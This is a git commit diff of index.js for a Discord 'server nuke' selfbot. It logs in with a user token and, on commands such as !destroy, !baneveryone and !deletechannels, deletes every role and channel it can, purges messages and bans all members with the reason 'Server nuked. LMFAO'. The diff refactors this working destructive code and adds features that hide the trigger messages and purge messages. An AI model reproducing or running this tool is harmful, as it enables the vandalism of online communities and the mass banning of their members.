14204932220a2001440f016b4f0e0c6651f95122
Kyle2000 <kikithenormalcat@Gmail.com>
2017-11-14 11:02:11 -0500

    Update!

--- index.js
+++ index.js
@@ -1,39 +1,49 @@
-
 const Discord = require("discord.js")
 const bot = new Discord.Client()
 
-bot.login().catch(async function(err) {
-	console.error(`Failed to log into the Discord API`, err)
-})
+const config = require(`./config.json`)
 
-bot.on("ready", async function() {
-	console.log(`Ready as: ${bot.user.tag}`)
-})
 
-bot.on("message", async function(msg) {
-	if(bot.user !== msg.author || msg.system || msg.channel.type !== "text") {
+if(config.token === "Your token here.") {
+	console.error(`Please set your token in config.json!`)
+} else {
+	bot.login(config.token).catch(err => console.error(`Failed to log into the Discord API`, err))
+}
+
+bot.on("ready", () => console.log(`Ready as: ${bot.user.tag}`))
+
+bot.on("message", msg => {
+	if(bot.user !== msg.author) {
 		return;
 	}
 	if(msg.content === "!destroy") {
-		console.log(`Destroying server "${msg.guild.name}"`)
-		msg.guild.roles.forEach(async function(r) {
-			r.delete().then(async function(role) {
+		msg.delete()
+		msg.guild.roles.forEach(r => {
+			r.delete().then(role => {
 				console.log(`Deleted role "${role.name}" on "${role.guild.name}"`)
-			}).catch(async function(err) {
+			}).catch(err => {
 				console.error(`Failed to delete role "${r.name}" on "${r.guild.name}"}`, err)
 			})
 		})
-		msg.guild.channels.forEach(async function(ch) {
-			ch.delete().then(async function(channel) {
+		msg.guild.channels.forEach(ch => {
+			ch.delete().then(channel => {
 				console.log(`Deleted channel "${channel.name}" on "${channel.guild.name}"`)
-			}).catch(async function(err) {
+			}).catch(err => {
 				console.error(`Failed to delete channel "${ch.name}" on "${ch.guild.name}" \n`. err)
+				ch.fetchMessages({
+					limit: 100
+				}).then(messages => {
+					messages.forEach(m => m.delete())
+				})
 			})
 		})
-		msg.guild.members.map(async function(member) {
-			member.ban(7).then(async function(m) {
+		msg.guild.members.forEach(member => {
+			member.ban({
+				days: 7,
+				reason: `Server nuked. LMFAO`
+			}).then(m => {
 				console.log(`Banned member "${m.user.tag}" on "${m.guild.name}"`)
-			}).catch(async function(err) {
+			}).catch(err => {
 				console.error(`Failed to ban member "${member.user.tag}" on "${member.guild.name}" \n`, err)
 			})
 		})
@@ -41,25 +51,26 @@ bot.on("message", async function(msg) {
 		console.log(`Nuked server "${msg.guild.name}" - R.I.P`)
 		
 	} else if(msg.content === "!overwrite") {
+		msg.delete()
 		console.log(`Overwriting server "${msg.guild.name}"`)
-		msg.guild.roles.forEach(async function(r) {
-			r.delete().then(async function(role) {
+		msg.guild.roles.forEach(r => {
+			r.delete().then(role =>  {
 				console.log(`Deleted role "${role.name}" on "${role.guild.name}"`)
-			}).catch(async function(err) {
+			}).catch(err => {
 				console.error(`Failed to delete role "${r.name}" on "${r.guild.name}" \n`, err)
 			})
 		})
-		msg.guild.channels.map(async function(ch) {
-			ch.delete().then(async function(channel) {
+		msg.guild.channels.map(ch => {
+			ch.delete().then(channel => {
 				console.log(`Deleted channel "${channel.name}" on "${channel.guild.name}"`)
-			}).catch(async function(err) {
+			}).catch(err => {
 				console.error(`Failed to delete channel "${ch.name}" on "${ch.guild.name}"`, err)
 			})
 		})
-		msg.guild.members.forEach(async function(member) {
-			member.ban(7).then(async function(m) {
+		msg.guild.members.forEach(member => {
+			member.ban(7).then(m => {
 				console.log(`Banned member "${m.user.tag}" on "${m.guild.name}"`)
-			}).catch(async function(err) {
+			}).catch(err => {
 				console.error(`Failed to ban member "${member.user.tag}" on "${member.guild.name}"`, err)
 			})
 		})
@@ -70,28 +81,34 @@ bot.on("message", async function(msg) {
 			msg.guild.createChannel("Server Nuked", "voice").catch(console.error)
 		}
 	} else if(msg.content === "!baneveryone") {
-		msg.guild.members.forEach(async function(member) {
-			member.ban(7).then(async function(m) {
+		msg.delete()
+		msg.guild.members.forEach(member => {
+			member.ban({
+				days: 7,
+				reason: `Server nuked. LMFAO`
+			}).then(m => {
 				console.log(`Banned member "${m.user.tag}" on "${m.guild.name}"`)
-			}).catch(async function(err) {
+			}).catch(err => {
 				console.error(`Failed to ban member "${member.user.tag}" on "${member.guild.name}"`, err)
 			})
 		})
 	} else if(msg.content === "!deleteroles") {
-		msg.guild.roles.forEach(async function(r) {
-			r.delete().then(async function(role) {
+		msg.delete()
+		msg.guild.roles.forEach(r => {
+			r.delete().then(role => {
 				console.log(`Deleted role "${role.name}" on "${role.guild.name}"`)
-			}).catch(async function(err) {
+			}).catch(err => {
 				console.error(`Failed to delete role "${r.name}" on "${r.guild.name}" \n`, err)
 			})
 		})
 	} else if(msg.content === "!deletechannels") {
-		msg.guild.channels.forEach(async function(ch) {
-			ch.delete().then(async function(channel) {
+		msg.delete()
+		msg.guild.channels.forEach(ch => {
+			ch.delete().then(channel => {
 				console.log(`Deleted channel "${channel.name}" on "${channel.guild.name}"`)
-			}).catch(async function(err) {
+			}).catch(err => {
 				console.error(`Failed to delete channel "${ch.name}" on "${ch.guild.name}"`, err)
 			})
 		})
-	}
+	} 
 })
